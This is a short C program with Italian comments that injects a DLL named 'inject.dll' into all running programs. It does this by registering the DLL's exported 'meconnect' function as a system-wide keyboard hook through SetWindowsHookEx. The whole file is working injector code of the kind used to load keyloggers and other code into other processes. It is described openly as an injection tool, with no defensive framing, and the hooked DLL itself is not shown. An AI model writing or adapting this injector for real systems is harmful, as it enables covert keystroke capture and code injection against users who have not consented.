// Programma che effettua l'iniezione della DLL "inject.dll"

#include <windows.h>
#include <stdio.h>

int main(int argc, TCHAR* argv[]){

    // Carica la libreria in cui si hookeranno le nostre funzioni.
    HMODULE dll = LoadLibrary("C:\\Users\\z3r0\\Desktop\\Doing\\inject.dll");
    if(dll == NULL){
        printf("DLL non trovata.");
        getchar();
        return -0x1;
    }

    // Ottiene l'indirizzo della funzione dentro la DLL.
    // E` possibile utilizzare lo strumento "dumpbin" per controllare se la funzione viene effettivamente esportata.
    HOOKPROC addr = (HOOKPROC) GetProcAddress(dll, "meconnect");
    if(addr == NULL){
        printf("La funzione non e`stata trovata.");
        getchar();
        return -0x1;
    }

    // Hook della funzione. Hookiamo gli eventi "WH_KEYBOARD" per tutti i programmi (ultimo argomento e` 0x0).
    HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, 0x0);
    if(handle == NULL){
        printf("La tastiera non puo`essere hookata.");
    }

    printf("Programma hookato corettamente.");
    getchar();

    // Unhook della funzione.
    UnhookWindowsHookEx(handle);

    return 0x0;
}

